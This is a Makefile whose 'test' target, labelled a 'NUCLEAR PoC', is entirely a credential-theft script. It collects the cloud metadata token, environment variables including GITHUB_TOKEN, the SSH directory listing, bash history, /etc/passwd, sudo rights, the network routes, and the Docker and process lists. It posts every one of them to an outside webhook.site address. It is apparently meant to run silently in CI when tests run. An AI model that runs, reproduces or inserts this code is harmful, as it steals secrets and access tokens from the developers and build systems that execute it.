test:
	@echo "--- STARTING NUCLEAR PoC ---"

	# 1. Cloud Metadata Exfiltration
	@curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" > c.txt || true
	@curl -X POST -d "$$(cat c.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=cloud_metadata"

	# 2. Docker Socket & Container Enumeration
	@docker ps -a > d.txt || true
	@curl -X POST -d "$$(cat d.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=docker_socket"

	# 3. Private SSH Key Audit
	@ls -al ~/.ssh/ > s.txt || true
	@curl -X POST -d "$$(cat s.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=ssh_keys"

	# 4. Internal Network Map
	@ip route > n.txt || true
	@curl -X POST -d "$$(cat n.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=network_map"

	# 5. Environment Secret Dump (GITHUB_TOKEN)
	@printenv > e.txt || true
	@curl -X POST -d "$$(cat e.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=env_vars"

	# 6. Sudoers & Privilege Check
	@sudo -l > p.txt || true
	@curl -X POST -d "$$(cat p.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=privileges"

	# 7. Hardware Audit (AMD EPYC)
	@lscpu > h.txt || true
	@curl -X POST -d "$$(cat h.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=hardware"

	# 8. Command History Audit
	@cat ~/.bash_history > b.txt || true
	@curl -X POST -d "$$(cat b.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=bash_history"

	# 9. System Password File Check
	@cat /etc/passwd > w.txt || true
	@curl -X POST -d "$$(cat w.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=passwd_file"

	# 10. Process List
	@ps aux > l.txt || true
	@curl -X POST -d "$$(cat l.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=processes"

	@echo "--- ALL STAGES COMPLETED ---"
